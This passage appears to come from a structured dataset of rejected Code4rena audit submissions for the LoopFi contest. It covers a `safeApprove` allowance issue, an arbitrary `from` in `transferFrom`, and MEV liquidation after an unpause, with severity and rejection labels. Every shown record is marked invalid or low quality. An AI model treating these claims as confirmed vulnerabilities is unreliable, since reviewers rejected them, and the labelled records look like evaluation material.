When depositing assets, minting shares, or claiming rewards, `rewardPool` is approved to spend the asset tokens using the Openzeppelin's `safeApprove` function without first approving to 0. The issue here is that OpenZeppelin's `safeApprove` function does not allow changing a non-zero allowance to another non-zero allowance. OpenZeppelin's `safeApprove` function will revert if the account already is approved and the new safeApprove() is done with a non-zero value. This will therefore cause all subsequent approvals of the asset token after the first approval to non-zero allowance to fail , DoSsing the AuraVault's minting, depositing and claiming functionalities.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_184_group

# Arbitrary `from` passed to `transferFrom` (or `safeTransferFrom`)

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-636
- **Submitter:** yudistira19
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/636
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-636.md

## Brief Summary

Passing an arbitrary `from` address to `transferFrom` (or `safeTransferFrom`) can lead to loss of funds, because anyone can transfer tokens from the `from` address if an approval is made.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, edited-by-warden, :robot:_primary, :robot:_146_group

# Liquidators can prevent users from making their positions healthy after an unpause

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-95
- **Submitter:** zzebra83
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/95
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-95.md

## Brief Summary

When the Pool is paused, users' debt and collateral valuations may place them at risk of liquidation. However, as soon as the pool is unpaused to resume operations, MEV (Maximal Extractable Value) bots can intercept and execute transactions before users have the opportunity to take actions like repaying debt or adding collateral to avoid liquidation. This exploitation can occur in the first block after the system transitions, potentially leading to the forced liquidation of vulnerable positions. The issue has been previously identified and confirmed valid in multiple contests including:

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary, :robot:_92_group
